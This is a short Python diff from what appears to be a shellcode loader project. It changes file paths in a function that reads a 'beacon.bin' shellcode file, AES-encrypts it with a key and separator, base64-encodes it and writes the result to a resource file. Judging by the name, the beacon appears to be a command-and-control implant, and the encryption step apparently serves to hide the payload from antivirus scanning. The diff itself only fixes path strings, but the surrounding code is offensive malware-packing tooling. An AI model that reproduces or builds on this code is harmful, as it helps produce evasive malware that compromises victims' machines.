@@ -10,7 +10,7 @@ from common.project_path import project_path
 
 
 def gen_aes_payload():
-    with open(project_path.get_project_path() + "./bean_raw/beacon.bin", "rb") as f:
+    with open(project_path.get_project_path() + "/bean_raw/beacon.bin", "rb") as f:
         shellcode = f.read()
     shellcode_cipher = crypto_utils.get_key()
     shellcode_cipher += b"||split||"
@@ -18,7 +18,7 @@ def gen_aes_payload():
     shellcode_cipher += crypto_utils.encrypt(shellcode)
     # print(shellcode_cipher)
     # logger.debug(shellcode_cipher)
-    with open(project_path.get_project_path() + "./resource/shellcode_cipher.tmp", "wb") as f:
+    with open(project_path.get_project_path() + "/resource/shellcode_cipher.tmp", "wb") as f:
         f.write(base64.b64encode(shellcode_cipher))
     # logger.info("payload 加密成功")
     # logger.info(f.name)
